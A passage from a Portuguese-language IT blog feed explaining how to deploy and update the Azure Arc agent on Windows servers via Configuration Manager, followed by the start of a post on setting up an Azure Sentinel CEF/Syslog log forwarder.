  &lt;li&gt;Acesse as propriedades do deployment type selecionando o aplicativo &amp;gt; clique na aba &lt;em&gt;Deployment Types&lt;/em&gt; &amp;gt; clique com o botão direito no deployment existente e selecione a opção &lt;em&gt;Properties&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/an2pGmr.png&quot; alt=&quot;ConfigMgr Console - Deployment Type Properties&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Na aba &lt;em&gt;Detection Method&lt;/em&gt;, selecione a opção &lt;em&gt;Use a custom script to detect the presence of this deployment type&lt;/em&gt; e clique no botão &lt;em&gt;Edit&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QkRIfhc.png&quot; alt=&quot;Deployment Type Properties - Detection Method&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Selecione a opção &lt;em&gt;Powershell&lt;/em&gt; e cole o snippet abaixo, clicando em &lt;em&gt;OK&lt;/em&gt; para concluir.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Este script de detecção verificará não apenas se o agente está devidamente instalado, mas se também estará conectado ao Azure Arc ao término do processo de instalação.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/BWSfWnQ.png&quot; alt=&quot;Detection Method - Script Editor&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;notice--warning&quot;&gt;:warning: &lt;strong&gt;Alerta&lt;/strong&gt;: É importante que o script apenas retorne algum output se o aplicativo estiver instalado. Qualquer output retornado o ConfigMgr interpreta como instalado.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Detection Method: Returns the installed version if properly installed&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentDetails&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ProgramW6432&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\AzureConnectedMachineAgent\azcmagent.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentStatus&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentDetails&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Where-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-like&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'*Agent Status*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentStatus&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Connected'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    	&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentDetails&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Where-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-like&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'*Agent Version*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Returns nothing if not installed&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Na aba &lt;em&gt;Requirements&lt;/em&gt; é importante também configurarmos as versões de Sistema Operacional que desejamos que este pacote seja instalado. Isso também evita que deployments acidentais venham instalar o produto em desktops Windows, o que não é suportado.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TMATvrP.png&quot; alt=&quot;Deployment Type Properties - Requirements - Create Requirement&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Após ajustes, clicar em &lt;em&gt;OK&lt;/em&gt; para finalizar a configuração.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Neste momento o application criado estará pronto para ser instalado nos servidores, onde poderá ser feito o deployment para uma collection, vide &lt;a href=&quot;https://docs.microsoft.com/en-us/mem/configmgr/apps/deploy-use/deploy-applications&quot;&gt;referência oficial&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;atualização-do-agente&quot;&gt;Atualização do agente&lt;/h3&gt;

&lt;p&gt;De acordo com a &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/manage-agent#upgrading-agent&quot;&gt;documentação&lt;/a&gt;, o Azure Arc pode ser atualizado de forma Manual ou via WSUS para Sistemas Operacionais Windows.&lt;/p&gt;

&lt;p&gt;Neste caso temos duas opções a serem seguidas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Criar outro application no Configuration Manager para a nova versão&lt;/strong&gt;:&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Este mecanismo requer maior esforço administrativo por parte do ConfigMgr porém pode ser alcançado criando outro Application para a nova versão, conforme orientado neste post.
        &lt;ul&gt;
          &lt;li&gt;Se desejar seguir com este método, a detecção deverá ser melhorada para levar em consideração a versão do Azure Arc instalado.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;É importante que seja definido para este novo aplicativo uma &lt;strong&gt;relação de substituição&lt;/strong&gt;, conforme pode ser visto em mais detalhes &lt;a href=&quot;https://docs.microsoft.com/en-us/mem/configmgr/apps/deploy-use/revise-and-supersede-applications#supersedence&quot;&gt;neste link&lt;/a&gt;. Isso permite que novas instalações que referenciam o item anterior façam uso da versão mais recente, além de permitir a definição do comportamento a ser seguido para as máquinas que já possuem o produto instalado, que pode ser atualizar ou desinstalar.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Incluir os produtos e serviços no Catálogo de Software Update Point e processo de gestão de atualizações de sua organização (recomendado)&lt;/strong&gt;: Esta abordagem permite o uso do processo já implementado de gestão de atualizações via ConfigMgr para também atualizar o Azure Arc.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;Os seguintes produtos e classificações devem estar selecionados para sincronismo do Software Update Point na infraestrutura. Os detalhes de como realizar esta ação estão disponíveis neste link &lt;a href=&quot;https://docs.microsoft.com/en-us/mem/configmgr/sum/get-started/configure-classifications-and-products&quot;&gt;neste link&lt;/a&gt;:&lt;/p&gt;

        &lt;table&gt;
          &lt;thead&gt;
            &lt;tr&gt;
              &lt;th&gt;Configuração&lt;/th&gt;
              &lt;th&gt;Valor a ser selecionado&lt;/th&gt;
            &lt;/tr&gt;
          &lt;/thead&gt;
          &lt;tbody&gt;
            &lt;tr&gt;
              &lt;td&gt;Produtos&lt;/td&gt;
              &lt;td&gt;Microsoft &amp;gt; Azure Connected Machine Agent&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;Classificação&lt;/td&gt;
              &lt;td&gt;Critical Updates&lt;/td&gt;
            &lt;/tr&gt;
          &lt;/tbody&gt;
        &lt;/table&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;conclusão&quot;&gt;Conclusão&lt;/h2&gt;

&lt;p&gt;Como pudemos ver o processo de instalação via Configuration Manager é bem simples, tendo apenas alguns ajustes para que possamos não apenas instalar o agente, mas também realizar o seu onboarding.&lt;/p&gt;

&lt;p&gt;Na documentação oficial temos outros métodos de deployment disponíveis, que podem ser conferidos diretamente em seus respectivos artigos oficiais:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/onboard-dsc&quot;&gt;Install Connected Machine agent using Windows PowerShell DSC - Azure Arc | Microsoft Docs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/onboard-windows-admin-center&quot;&gt;Connect hybrid machines to Azure from Windows Admin Center - Azure Arc | Microsoft Docs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/onboard-powershell&quot;&gt;Connect hybrid machines to Azure by using PowerShell - Azure Arc | Microsoft Docs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Espero que as orientações compartilhadas lhe sejam úteis para a criação deste deployment via ConfigMgr, permitindo a gestão destes dispositivos a partir da console do Azure.&lt;/p&gt;

&lt;p&gt;Até o próximo post! :smile:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Azure Arc" /><category term="Azure" /><category term="Arc" /><category term="Windows" /><category term="ConfigMgr" /><category term="MECM" /><category term="MEM" /><summary type="html">Neste post compartilho o procedimento de como realizar o deploy e atualização do Azure Arc for Servers (Windows) via Microsoft Endpoint Manager Configuration Manager - MECM (aka SCCM). O processo é bastante simples, porém algumas pequenas dicas são compartilhadas para que possa obter o máximo do ConfigMgr para esta atividade :smile:. :information_source: Nota: Os scripts compartilhados neste post também poderão ser utilizado a partir de outras ferramentas de gestão de configuração, porém ajustes podem ser necessários para que funcionem adequadamente de acordo com o método utilizado. Azure Arc enabled Servers O Azure Arc permite o gerenciamento de servidores físicos e virtuais fora do Azure a partir da console do Azure, permitindo que gerencie extensões, atualizações e guest policies de forma consistente do mesmo modo em que máquinas virtuais nativas do Azure são gerenciadas. O Azure Arc é um asset bastante importante para utilização de features como o Vulnerability Assessment do Azure Defender, assim como a manutenção de algumas extensões como Microsoft Monitoring Agent (MMA) e o novo Azure Monitor Agent (AMA). Preço De acordo com a página Azure Arc – Azure Management | Microsoft Azure, features relacionadas ao control plane do Azure (Instalação de Extensões, Arm Templates, etc.) são gratuitos, assim como o uso do Azure Update Management. Features relacionadas à Azure Policy Guest Configurations (Automações, inventários, state configuration) e outros serviços conectados via Arc (Azure Defender e Azure Monitor, por exemplo) são cobrados de acordo com suas respectivas tabelas de custos, as quais poderão ser verificadas diretamente na calculadora do Azure. Pré-requisitos Alguns requisitos devem ser observados para viabilizar esta instalação, cujos detalhes podem ser observados no link Overview of the Connected Machine agent - Azure Arc | Microsoft Docs: Um Sistema Operacional Suportado. Liberação das URLs necessárias para o Serviço do Azure Arc, vide link acima citado. Dependendo de como seu ambiente está configurado, o uso de um servidor proxy pode ser necessário. Algumas extensões a serem instaladas via Arc podem necessitar de liberações adicionais para garantir seu funcionamento. Provisionamento de um Service Principal para que o onboarding do Arc seja feito de modo silencioso. O procedimento de criação deste objeto está disponível detalhado em Connect hybrid machines to Azure at scale - Azure Arc | Microsoft Docs. Ativação dos resource providers Microsoft.HybridCompute e Microsoft.GuestConfiguration, conforme discutido em Connect hybrid machine with Azure Arc enabled servers - Azure Arc | Microsoft Docs. Gestão via Configuration Configuration Manager Caso sua organização já faça uso do Configuration Manager para gestão de dispositivos, o mesmo também poderá ser utilizado para instalação e atualização do Azure Machine Connected Agent, utilizado pelo Azure Arc. Instalação do Agente Utilizando o recurso de Applications do Configuration Manager, temos a possibilidade de garantir que estes agentes estão instalados adequadamente em um dispositivo, o que permite uma melhor gestão do status de instalação do pacote após sua execução. Abaixo descrevo o procedimento utilizado para criar este recurso: Download da última release do instalador do Arc para Windows: O binário de instalação pode ser baixado diretamente da URL encurtada https://aka.ms/AzureConnectedMachineAgent. A linha de PowerShell abaixo salva o arquivo em um diretório especificado. O arquivo deverá ser copiado para um diretório a ser utilizado pelo MECM como content source $destinationPath = &quot;c:\path\to\file&quot; Invoke-WebRequest -Uri https://aka.ms/AzureConnectedMachineAgent -OutFile &quot;$destinationPath\AzureConnectedMachineAgent.msi&quot; Baixar e editar o script Install-AzureArcMECM.ps1 e editar as variáveis conforme exemplo abaixo. Este script deverá ser colocado no mesmo caminho onde o arquivo *.msi baixado anteriormente está localizado. Caso seu servidor necessite de um proxy para comunicação. especifique a variável $proxyUrl. Caso contrário, mantenha o valor em branco. O script compartilhado, além de instalar o agente, realiza a configuração de proxy (se informado) e conecta o dispositivo ao serviço do Arc, conforme credenciais compartilhadas: ## Variables $installLogFile = &quot;c:\Windows\Temp\AzureArcSetup.log&quot; $tenantID = &quot;7482a3c1-7102-4a0d-9dfb-0aa2186ce450&quot; $subscriptionID = &quot;48a0ab65-bd82-4aac-9283-99344f387d9b&quot; $ResourceGroupName = &quot;rg-azurearc-windows&quot; $serviceprincipalAppID = &quot;909e06f7-577c-45b9-b49e-eff9e6560ef6&quot; $serviceprincipalSecret = &quot;f53f0a59-6db3-4ac7-b861-e760d29240d8&quot; $resourceLocation = &quot;eastus&quot; $proxyUrl = &quot;&quot; # Format: http[s]://server.fqdn:port ### Sample data provided for illustration purposes Seguir com a criação do application no console do MECM acessando Software Library &amp;gt; Application Management &amp;gt; Applications e selecionar a opção Create Application no ribbon ou no menu de contexto de Application. Selecione o arquivo caminho do *.msi no File Share onde foi armazenado, de acordo com o pré-estabelecido em seu ambiente. Clique em Next para avançar após validar os dados do aplicativo a ser instalado. Em General Information, substitua a linha de comando pré-configurada com a linha de comando abaixo para que a instalação ocorra a partir do script PowerShell baixado e clique em Next. %windir%\System32\WindowsPowerShell\v1.0\powershell.exe -File .\Install-AzureArcMECM.ps1 :bulb: Dica: Complemente nesta janela também as informações solicitadas para enriquecer os dados de catálogo para este aplicativo e simplificar sua gestão posterior. Revise as informações configuradas e clique em Next para criar o application. Após concluída a criação, a seguinte mensagem de sucesso será exibida. Clique em Close para fechá-la. Após criar o application, precisaremos ajudar alguns outros detalhes para que funcione de forma mais adequada, conforme abaixo: Acesse as propriedades do deployment type selecionando o aplicativo &amp;gt; clique na aba Deployment Types &amp;gt; clique com o botão direito no deployment existente e selecione a opção Properties. Na aba Detection Method, selecione a opção Use a custom script to detect the presence of this deployment type e clique no botão Edit. Selecione a opção Powershell e cole o snippet abaixo, clicando em OK para concluir. Este script de detecção verificará não apenas se o agente está devidamente instalado, mas se também estará conectado ao Azure Arc ao término do processo de instalação. :warning: Alerta: É importante que o script apenas retorne algum output se o aplicativo estiver instalado. Qualquer output retornado o ConfigMgr interpreta como instalado. # Detection Method: Returns the installed version if properly installed try{ $agentDetails = &amp;amp; &quot;$env:ProgramW6432\AzureConnectedMachineAgent\azcmagent.exe&quot; show $agentStatus = ($agentDetails | Where-Object {$_ -like '*Agent Status*'}).Split(&quot;: &quot;)[-1] if($agentStatus -eq 'Connected' ){ Write-Output ($agentDetails | Where-Object {$_ -like '*Agent Version*'}).Split(&quot;: &quot;)[-1] } } catch{ # Returns nothing if not installed } Na aba Requirements é importante também configurarmos as versões de Sistema Operacional que desejamos que este pacote seja instalado. Isso também evita que deployments acidentais venham instalar o produto em desktops Windows, o que não é suportado. Após ajustes, clicar em OK para finalizar a configuração. Neste momento o application criado estará pronto para ser instalado nos servidores, onde poderá ser feito o deployment para uma collection, vide referência oficial. Atualização do agente De acordo com a documentação, o Azure Arc pode ser atualizado de forma Manual ou via WSUS para Sistemas Operacionais Windows. Neste caso temos duas opções a serem seguidas: Criar outro application no Configuration Manager para a nova versão: Este mecanismo requer maior esforço administrativo por parte do ConfigMgr porém pode ser alcançado criando outro Application para a nova versão, conforme orientado neste post. Se desejar seguir com este método, a detecção deverá ser melhorada para levar em consideração a versão do Azure Arc instalado. É importante que seja definido para este novo aplicativo uma relação de substituição, conforme pode ser visto em mais detalhes neste link. Isso permite que novas instalações que referenciam o item anterior façam uso da versão mais recente, além de permitir a definição do comportamento a ser seguido para as máquinas que já possuem o produto instalado, que pode ser atualizar ou desinstalar. Incluir os produtos e serviços no Catálogo de Software Update Point e processo de gestão de atualizações de sua organização (recomendado): Esta abordagem permite o uso do processo já implementado de gestão de atualizações via ConfigMgr para também atualizar o Azure Arc. Os seguintes produtos e classificações devem estar selecionados para sincronismo do Software Update Point na infraestrutura. Os detalhes de como realizar esta ação estão disponíveis neste link neste link: Configuração Valor a ser selecionado Produtos Microsoft &amp;gt; Azure Connected Machine Agent Classificação Critical Updates Conclusão Como pudemos ver o processo de instalação via Configuration Manager é bem simples, tendo apenas alguns ajustes para que possamos não apenas instalar o agente, mas também realizar o seu onboarding. Na documentação oficial temos outros métodos de deployment disponíveis, que podem ser conferidos diretamente em seus respectivos artigos oficiais: Install Connected Machine agent using Windows PowerShell DSC - Azure Arc | Microsoft Docs Connect hybrid machines to Azure from Windows Admin Center - Azure Arc | Microsoft Docs Connect hybrid machines to Azure by using PowerShell - Azure Arc | Microsoft Docs Espero que as orientações compartilhadas lhe sejam úteis para a criação deste deployment via ConfigMgr, permitindo a gestão destes dispositivos a partir da console do Azure. Até o próximo post! :smile:</summary></entry><entry><title type="html">Azure Sentinel: Configuração do Log Forwarder</title><link href="https://davicruz.com/azure-sentinel/2021/03/rsyslog-sentinel-log-forwarder/" rel="alternate" type="text/html" title="Azure Sentinel: Configuração do Log Forwarder" /><published>2021-03-29T12:00:00-03:00</published><updated>2021-04-30T16:00:00-03:00</updated><id>https://davicruz.com/azure-sentinel/2021/03/rsyslog-sentinel-log-forwarder</id><content type="html" xml:base="https://davicruz.com/azure-sentinel/2021/03/rsyslog-sentinel-log-forwarder/">&lt;p&gt;Frequentemente apoio clientes no deployment de &lt;em&gt;forwarders&lt;/em&gt; (encaminhadores) de logs CEF/Syslog em seus ambientes para coletar informações de appliances de rede e/ou servidores e serviços para o Log Analytics, que consequentemente os disponibiliza para o Azure Sentinel.&lt;/p&gt;

&lt;p&gt;Embora tenhamos uma diversidade de documentações em como fazer este deployment, assim como recursos de comunidade como o Tech Community e Webinars, compilei todos os pontos que normalmente reviso com meus clientes nestes engajamentos de deployment e revisão neste post para ajudar àqueles que estejam enfrentando algum desafio em seu ambiente.&lt;/p&gt;

&lt;div class=&quot;notice--success&quot;&gt;

&lt;p&gt;:newspaper: &lt;strong&gt;Edits&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;30/04/2021&lt;/strong&gt; - Incluído seção &lt;a href=&quot;#redução-de-mensagens-repetidas&quot;&gt;Redução de mensagens repetidas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;/div&gt;

&lt;h2 id=&quot;requisitos&quot;&gt;Requisitos&lt;/h2&gt;

&lt;p&gt;De acordo com a &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/sentinel/connect-common-event-format&quot;&gt;documentação oficial da Microsoft&lt;/a&gt;, os requisitos para este recurso são bastante simples, conforme listado abaixo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;4 CPUs e 8GB RAM, que é capaz de processar cerca de 8500 EPS (eventos por segundo) utilizando o rsyslog, de acordo com a documentação.
    &lt;ul&gt;
      &lt;li&gt;Se estiver realizado este deployment no Azure você pode utilizar o SKU &lt;strong&gt;Standard_F4s_v2&lt;/strong&gt; que é otimizado para processamento e recomendado neste caso.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Uma distribuição Linux em que o Microsoft Monitoring Agent (também conhecido como omsagent) seja suportado.&lt;/li&gt;
  &lt;li&gt;Python versão 2.7 ou 3.&lt;/li&gt;
  &lt;li&gt;Um dos serviços de syslog suportados instalado. Na maioria dos cenários que trabalhei utilizei o &lt;strong&gt;rsyslog&lt;/strong&gt;, uma vez que normalmente é o pacote padrão na maioria das distribuições. Abaixo a lista das versões suportadas, também de acordo com a documentação:
    &lt;ul&gt;
      &lt;li&gt;Rsyslog v8&lt;/li&gt;
      &lt;li&gt;Syslog-ng 2.1 - 3.22.1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;arquitetura-do-forwarder&quot;&gt;Arquitetura do Forwarder&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/t2cvlm7.png&quot; alt=&quot;Forwarder Architecture&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A arquitetura da solução é bem simples:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;É composta por uma ou mais máquinas recebendo os logs em protocolo syslog via UDP, TCP ou TLS. Isso é alcançado a partir da configuração de listeners no rsyslog ou no syslog-ng, assim como quaisquer servidores syslog você tenha ou teve em execução em seu ambiente.&lt;/li&gt;
  &lt;li&gt;As mensagens recebidas são encaminhadas para os listeners locais que são configurados no omsagent para ingestão como logs puros em Syslog (UDP/25224) ou CEF (TCP/25226).&lt;/li&gt;
  &lt;li&gt;Mensagens são encaminhadas ao Log Analytics workspace de acordo com a sua configuração, acessíveis também ao Sentinel a partir da ativação da solução.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Agora vou orientá-los quando aos detalhes da configuração desta infraestrutura e compartilhar algumas dicas de configurações mais detalhadas para mitigar alguns problemas e reduzir ingestão desnecessária no seu ambiente.&lt;/p&gt;

&lt;h3 id=&quot;considerações-de-design&quot;&gt;Considerações de Design&lt;/h3&gt;

&lt;p&gt;Antes de realizar o deploy/revisar a infraestrutura do seu forwarder, existem algumas perguntas que precisamos responder que auxiliarão na correta definição das suas configurações:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Este forwarder receberá apenas mensagens CEF, Syslog ou ambos?&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Embora ambos os tipos de mensagens sejam recebidos via protocolo syslog, as mensagens CEF são formatadas de acordo com seu padrão pelo omsagent, disponibilizando cada campo em uma coluna própria no Log Analytics, enquanto as mensagens Syslog puro são armazenadas em uma única coluna, o que irá requerer esforço adicional quando necessário realizar a análise destes dados em alguma regra.&lt;/li&gt;
      &lt;li&gt;Também, se você estiver utilizando o forwarder para ambos os tipos de logs, precisará impedir que mensagens enviadas do tipo CEF sejam armazenadas também como Syslog, o que irá incorrer em &lt;strong&gt;custo duplicado&lt;/strong&gt; para sua workspace.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Quais são os facilities e severidades, assim como tipos de mensagens e fontes que serão encaminhados ao Sentinel?&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Envio de dados em excesso ao Sentinel pode gerar alto custo se não filtrados adequadamente.&lt;/li&gt;
      &lt;li&gt;Considere mapear os cenários de detecção de acordo com o &lt;a href=&quot;https://attack.mitre.org/matrices/enterprise/&quot;&gt;MITRE ATT&amp;amp;CK Matrix Techniques&lt;/a&gt; que tem interesse investigar antes de enviar os dados. Desta forma você conseguirá evitar o envio de dados sem um propósito ao seu SIEM, que não lhe trarão nenhum retorno sobre o investimento feito tanto em armazenamento quanto no Sentinel.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Quais são os requisitos de segurança para esta comunicação?&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Como descrito no post sobre &lt;a href=&quot;https://techcommunity.microsoft.com/t5/azure-sentinel/best-practices-for-common-event-format-cef-collection-in-azure/ba-p/969990&quot;&gt;boas práticas&lt;/a&gt; compartilhado por Cristhofer Romeo Muñoz, &lt;strong&gt;devemos utilizar TCP como o protocolo padrão&lt;/strong&gt; para qualquer comunicação devido a sua confiabilidade, a menos que seu appliance apenas suporte UDP ou se necessite de criptografia na comunicação, adotando TLS quando o dado for transmitido pela internet ou se houver dados sensíveis a serem coletados.&lt;/li&gt;
      &lt;li&gt;Instalando o forwarder próximo da fonte também ajuda a reduzir a complexidade dos protocolos utilizados, assim como evita que tenhamos problemas de performance causados por alta latencia na comunicação entre origem e forwarder.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;instalação&quot;&gt;Instalação&lt;/h2&gt;

&lt;p&gt;A instalação inicial pode ser facilmente realizada executando o script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cef_installer.py&lt;/code&gt;, disponível no &lt;a href=&quot;https://github.com/Azure/Azure-Sentinel/blob/master/DataConnectors/CEF/cef_installer.py&quot;&gt;repositório oficial do Github&lt;/a&gt; utilizando a linha de comando abaixo, que pode ser obtida para seu ambiente acessando a página do conector &lt;strong&gt;Common Event Format (CEF)&lt;/strong&gt; no Sentinel ou simplesmente substituir os dados &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;workspace id&amp;gt;&lt;/code&gt; e &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;workspace secret&amp;gt;&lt;/code&gt; pelos de sua workspace.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Nota&lt;/strong&gt;: Se não tiver o python 2.7 na máquina deverá substituir a instrução &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3&lt;/code&gt; antes de executar a linha abaixo.&lt;/p&gt;

